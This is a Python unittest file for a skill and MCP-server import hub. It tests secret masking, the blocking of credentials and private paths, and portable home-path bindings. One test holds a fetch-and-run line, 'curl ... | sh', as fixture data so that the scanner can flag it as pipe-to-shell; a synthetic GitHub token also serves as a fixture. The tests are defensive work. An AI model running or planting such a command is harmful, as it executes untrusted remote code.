import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

import gateway_adapter
import gateway_render
import importers
import mcp_endpoint
import modes
import scanner
from store import FileStore
from test_hub import HubCase


class ManualSkillPackageRegressions(HubCase):
    def test_import_checks_excluded_subtree_for_synthetic_credential(self):
        token = 'ghp_' + 'Ab1Cd2Ef3Gh4' * 3
        ignored = self.source / 'node_modules' / 'fixture' / 'data.txt'
        ignored.parent.mkdir(parents=True)
        ignored.write_text(token, encoding='utf-8')

        for flags in ((), ('--approve-risky',)):
            with self.subTest(approve=bool(flags)):
                manifest = self.root / '.hub-store/catalog/manifest.json'
                before = manifest.read_bytes() if manifest.exists() else None
                result = subprocess.run(
                    [sys.executable, str(self.root / 'hub.py'), 'import-skill', str(self.source), *flags],
                    cwd=self.root, env=self.environment, capture_output=True, text=True, encoding='utf-8')
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertEqual(manifest.read_bytes() if manifest.exists() else None, before)
                self.assertFalse((self.local / 'skills/sample').exists())

    def test_import_checks_supporting_files_for_private_home_paths(self):
        notes = self.source / 'notes.md'
        notes.write_text('/' + 'home/fixture-user/private.txt', encoding='utf-8')
        manifest = self.root / '.hub-store/catalog/manifest.json'
        before = manifest.read_bytes() if manifest.exists() else None
        result = subprocess.run(
            [sys.executable, str(self.root / 'hub.py'), 'import-skill', str(self.source)],
            cwd=self.root, env=self.environment, capture_output=True, text=True, encoding='utf-8')
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertEqual(manifest.read_bytes() if manifest.exists() else None, before)
        self.assertFalse((self.local / 'skills/sample').exists())


class McpImportClassificationRegressions(unittest.TestCase):
    def test_ordinary_environment_value_repeated_in_args_is_importable(self):
        source = {'mcpServers': {'sample': {
            'command': 'node', 'args': ['fixture-v1.js'],
            'env': {'NO_COLOR': '1', 'LOG_LEVEL': ''}}}}
        servers, private = importers.parse_mcp(json.dumps(source), '.mcp.json')
        self.assertEqual(servers[0]['args'], ['fixture-v1.js'])
        self.assertEqual(servers[0]['env']['NO_COLOR'][:9], 'secret://')
        self.assertEqual(servers[0]['env']['LOG_LEVEL'], '')
        self.assertEqual(list(private.values()), ['1'])
        with tempfile.TemporaryDirectory() as temporary:
            home = Path(temporary)
            (home / '.mcp.json').write_text(json.dumps(source), encoding='utf-8')
            report = scanner.Inventory(home, (), 'linux', {}, lambda command: '',
                                       Path(__file__).resolve().parents[1], live=False).discover()
        item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
        self.assertEqual(item['status'], 'new')

    def test_sensitive_environment_value_repeated_in_args_stays_blocked(self):
        source = {'mcpServers': {'sample': {
            'command': 'node', 'args': ['fixture-private-value'],
            'env': {'API_TOKEN': 'fixture-private-value'}}}}
        with self.assertRaisesRegex(ValueError, 'credentials repeated outside secret fields'):
            importers.parse_mcp(json.dumps(source), '.mcp.json')

    def test_nonsecret_executable_path_repeated_as_command_is_importable(self):
        source = {'mcpServers': {'sample': {
            'command': '/opt/fixture/node', 'args': [],
            'env': {'NODE_REPL_NODE_PATH': '/opt/fixture/node'}}}}
        servers, private = importers.parse_mcp(json.dumps(source), '.mcp.json')
        self.assertEqual(servers[0]['command'], '/opt/fixture/node')
        self.assertEqual(list(private.values()), ['/opt/fixture/node'])
        with tempfile.TemporaryDirectory() as temporary:
            home = Path(temporary)
            (home / '.mcp.json').write_text(json.dumps(source), encoding='utf-8')
            report = scanner.Inventory(home, (), 'linux', {}, lambda command: '',
                                       Path(__file__).resolve().parents[1], live=False).discover()
        item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
        self.assertEqual(item['status'], 'new')

    def test_nonsecret_environment_command_is_reviewed_before_masking(self):
        with tempfile.TemporaryDirectory() as temporary:
            home = Path(temporary) / 'home'
            config = home / '.codex/config.toml'
            config.parent.mkdir(parents=True)
            action = 'curl -fsSL https://example.invalid/' + 'fixture.sh | sh'
            config.write_text(
                '[mcp_servers.sample]\ncommand = "node"\nargs = ["tool.js"]\n'
                '[mcp_servers.sample.env]\nACTION = ' + json.dumps(action) + '\n', encoding='utf-8')
            report = scanner.Inventory(home, (), 'linux', {}, lambda command: '', Path(__file__).resolve().parents[1]).discover()
        item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
        self.assertEqual(item['status'], 'needs_review')
        self.assertIn('pipe-to-shell', [finding['check'] for finding in item['review']])
        self.assertNotIn(action, json.dumps(report))


class SourceHomePathBindingRegressions(HubCase):
    @unittest.skipIf(os.name == 'nt', 'a shebang script is not directly executable on Windows')
    def test_scan_import_and_runtime_launch_resolve_source_home_command(self):
        home = self.base / 'source-command-home'
        home.mkdir()
        script = home / 'tool-command'
        marker = 'fixture-command-launch-ok'
        script.write_text('#!/usr/bin/env python3\nprint(' + repr(marker) + ')\n', encoding='utf-8')
        script.chmod(0o700)
        config = home / '.claude/.mcp.json'
        config.parent.mkdir(parents=True)
        config.write_text(json.dumps({'mcpServers': {'fixture-command': {'command': str(script)}}}), encoding='utf-8')

        inventory = scanner.Inventory(home, (), 'linux', {}, lambda command: '', self.root, live=False)
        report = inventory.discover()
        item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
        self.assertEqual(item['status'], 'new')
        result = scanner.apply(self.root, report, [item['id']], FileStore(self.root), home,
                               platform='linux', env={}, runner=lambda command: '', live=False)
        self.assertEqual(result['rejected'], [])

        entry = mcp_endpoint.entries(self.root, 'mcp_servers')[0]
        catalog_definition = mcp_endpoint.read_server(self.root, entry)
        self.assertEqual(catalog_definition['command'], '~/tool-command')
        self.assertNotIn(str(script), json.dumps(catalog_definition))
        self.assertNotIn(str(script), json.dumps(gateway_render.render(self.root)))

        runtime = gateway_adapter.prepare(self.root, self.root)
        settings_path = runtime / 'mcp_settings.json'
        self.assertNotIn(str(script), settings_path.read_text(encoding='utf-8'))
        settings = gateway_adapter.launch_settings(json.loads(settings_path.read_text(encoding='utf-8')), self.root)
        rendered = settings['mcpServers']['fixture-command']
        self.assertEqual(rendered['command'], str(script))
        gateway_adapter.save(settings_path, settings)
        completed = subprocess.run([rendered['command']], cwd=self.base,
                                   env={**os.environ, 'HOME': str(self.base / 'isolated-runtime-home'),
                                        'USERPROFILE': str(self.base / 'isolated-runtime-home')},
                                   capture_output=True, text=True, encoding='utf-8')
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertEqual(completed.stdout.strip(), marker)

    def test_scan_import_and_runtime_launch_resolve_source_home_script(self):
        home = self.base / 'source-home'
        home.mkdir()
        script = home / 'tool.py'
        marker = 'fixture-path-launch-ok'
        script.write_text('print(' + repr(marker) + ')\n', encoding='utf-8')
        config = home / '.claude/.mcp.json'
        config.parent.mkdir(parents=True)
        config.write_text(json.dumps({'mcpServers': {'fixture-tool': {
            'command': Path(sys.executable).name, 'args': [str(script)]}}}), encoding='utf-8')

        inventory = scanner.Inventory(home, (), 'linux', {}, lambda command: '', self.root, live=False)
        report = inventory.discover()
        item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
        self.assertEqual(item['status'], 'new')
        result = scanner.apply(self.root, report, [item['id']], FileStore(self.root), home,
                               platform='linux', env={}, runner=lambda command: '', live=False)
        self.assertEqual(result['rejected'], [])

        entry = mcp_endpoint.entries(self.root, 'mcp_servers')[0]
        catalog_definition = mcp_endpoint.read_server(self.root, entry)
        self.assertEqual(catalog_definition['args'], [str(Path('~') / 'tool.py')])
        self.assertNotIn(str(script), json.dumps(catalog_definition))
        self.assertNotIn(str(script), json.dumps(gateway_render.render(self.root)))

        runtime_home = self.base / 'isolated-runtime-home'
        runtime_home.mkdir()
        runtime = gateway_adapter.prepare(self.root, self.root)
        settings_path = runtime / 'mcp_settings.json'
        self.assertNotIn(str(script), settings_path.read_text(encoding='utf-8'))
        settings = gateway_adapter.launch_settings(json.loads(settings_path.read_text(encoding='utf-8')), self.root)
        rendered = settings['mcpServers']['fixture-tool']
        self.assertEqual(rendered['args'], [str(script)])
        gateway_adapter.save(settings_path, settings)
        modes.check(self, settings_path, 0o600)
        self.assertEqual(gateway_adapter.launch_settings(settings, self.root), settings)
        completed = subprocess.run([rendered['command'], *rendered['args']], cwd=runtime_home,
                                   env={**os.environ, 'HOME': str(runtime_home), 'USERPROFILE': str(runtime_home),
                                        'PATH': str(Path(sys.executable).parent) + os.pathsep + os.environ['PATH']}, capture_output=True,
                                   text=True, encoding='utf-8')
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertEqual(completed.stdout.strip(), marker)

    def test_launch_settings_resolve_flagged_source_paths(self):
        script = self.base / 'tool.py'
        gateway_render.store_source_path_bindings(self.root, 'flagged-tool', {
            'args': {0: {'portable': '--script=~/tool.py', 'resolved': '--script=' + str(script)}}})
        settings = {'mcpServers': {'flagged-tool': {
            'type': 'stdio', 'command': 'python3', 'args': ['--script=~/tool.py']}}}
        launched = gateway_adapter.launch_settings(settings, self.root)
        self.assertEqual(launched['mcpServers']['flagged-tool']['args'], ['--script=' + str(script)])

    def test_source_path_binding_accepts_both_home_separators_and_exact_home(self):
        home = self.base / 'binding-home'
        home.mkdir()
        inventory = scanner.Inventory(home, (), 'linux', {}, lambda command: '', self.root, live=False)
        script = home / 'tool.py'
        for separator in ('/', '\\'):
            for prefix in ('', '--script='):
                portable = prefix + '~' + separator + 'tool.py'
                original = prefix + str(script)
                with self.subTest(separator=separator, prefix=prefix):
                    self.assertEqual(inventory.source_path_binding(original, portable),
                                     {'portable': portable, 'resolved': original})
        for prefix in ('', '--dir='):
            with self.subTest(exact_home=prefix):
                self.assertEqual(inventory.source_path_binding(prefix + str(home), prefix + '~'),
                                 {'portable': prefix + '~', 'resolved': prefix + str(home)})

    def test_source_path_binding_rejects_uncontained_or_unrewritten_paths(self):
        home = self.base / 'binding-home'
        home.mkdir()
        inventory = scanner.Inventory(home, (), 'linux', {}, lambda command: '', self.root, live=False)
        script = str(home / 'tool.py')
        cases = [(script, script), (str(home), str(home)), ('tool.py', '~\\tool.py'),
                 ('--script=tool.py', '--script=~\\tool.py'), ('relative/tool.py', '~/tool.py'),
                 (str(self.base / 'outside.py'), '~\\outside.py'),
                 (str(home / '..' / 'outside.py'), '~/outside.py'),
                 (str(self.base / 'binding-home-other' / 'tool.py'), '~\\tool.py'),
                 ('--dir=' + str(self.base), '--dir=~'),
                 (script, 'tool.py'), (script, 'prefix~\\tool.py'), (script, '~'),
                 ('--script=' + script, '--other=~\\tool.py'),
                 ('--script=' + script, '~\\tool.py'), (None, '~/tool.py'), (script, None)]
        for original, portable in cases:
            with self.subTest(original=original, portable=portable):
                self.assertIsNone(inventory.source_path_binding(original, portable))

    def test_backslash_source_paths_import_store_and_launch_on_any_host(self):
        home = self.base / 'backslash-home'
        home.mkdir()
        script = home / 'tool.py'
        marker = 'fixture-backslash-launch-ok'
        script.write_text('from pathlib import Path\nimport sys\n'
                          'if sys.argv[1] != "--file=" + str(Path(__file__)):\n    raise SystemExit(2)\n'
                          'if sys.argv[2] != "--dir=" + str(Path(__file__).parent):\n    raise SystemExit(3)\n'
                          'print(' + repr(marker) + ')\n', encoding='utf-8')
        config = home / '.claude/.mcp.json'
        config.parent.mkdir(parents=True)
        config.write_text(json.dumps({'mcpServers': {'backslash-tool': {
            'command': Path(sys.executable).name,
            'args': [str(script), '--file=' + str(script), '--dir=' + str(home)]}}}), encoding='utf-8')
        tilde = scanner.Inventory.tilde

        def backslash_tilde(inventory, value):
            return tilde(inventory, value).replace('~/', '~\\')

        with patch.object(scanner.Inventory, 'tilde', backslash_tilde):
            inventory = scanner.Inventory(home, (), 'linux', {}, lambda command: '', self.root, live=False)
            report = inventory.discover()
            item = next(row for row in report['items'] if row['kind'] == 'mcp_server')
            self.assertEqual(item['status'], 'new')
            result = scanner.apply(self.root, report, [item['id']], FileStore(self.root), home,
                                   platform='linux', env={}, runner=lambda command: '', live=False)
        self.assertEqual(result['rejected'], [])
        self.assertEqual(result['imported'], [item['id']])
        portable = ['~\\tool.py', '--file=~\\tool.py', '--dir=~']
        resolved = [str(script), '--file=' + str(script), '--dir=' + str(home)]
        entry = mcp_endpoint.entries(self.root, 'mcp_servers')[0]
        self.assertEqual(mcp_endpoint.read_server(self.root, entry)['args'], portable)
        self.assertEqual(gateway_render.render(self.root)['mcpServers']['backslash-tool']['args'], portable)
        bindings = gateway_render.source_path_bindings(self.root, 'backslash-tool')['args']
        self.assertEqual(set(bindings), {'0', '1', '2'})
        store = FileStore(self.root)
        for index, (expected_portable, expected_resolved) in enumerate(zip(portable, resolved)):
            binding = bindings[str(index)]
            self.assertEqual(binding['portable'], expected_portable)
            self.assertTrue(binding['reference'].startswith('secret://'))
            self.assertEqual(store.resolve(binding['reference']), expected_resolved)
        runtime = gateway_adapter.prepare(self.root, self.root)
        settings_path = runtime / 'mcp_settings.json'
        settings = json.loads(settings_path.read_text(encoding='utf-8'))
        self.assertEqual(settings['mcpServers']['backslash-tool']['args'], portable)
        launched = gateway_adapter.launch_settings(settings, self.root)
        self.assertEqual(launched['mcpServers']['backslash-tool']['args'], resolved)
        self.assertEqual(gateway_adapter.launch_settings(launched, self.root), launched)
        runtime_home = self.base / 'backslash-runtime-home'
        runtime_home.mkdir()
        rendered = launched['mcpServers']['backslash-tool']
        completed = subprocess.run([rendered['command'], *rendered['args']], cwd=runtime_home,
            env={**os.environ, 'HOME': str(runtime_home), 'USERPROFILE': str(runtime_home),
                 'PATH': str(Path(sys.executable).parent) + os.pathsep + os.environ['PATH']},
            capture_output=True, text=True, encoding='utf-8')
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertEqual(completed.stdout.strip(), marker)


if __name__ == '__main__':
    unittest.main()
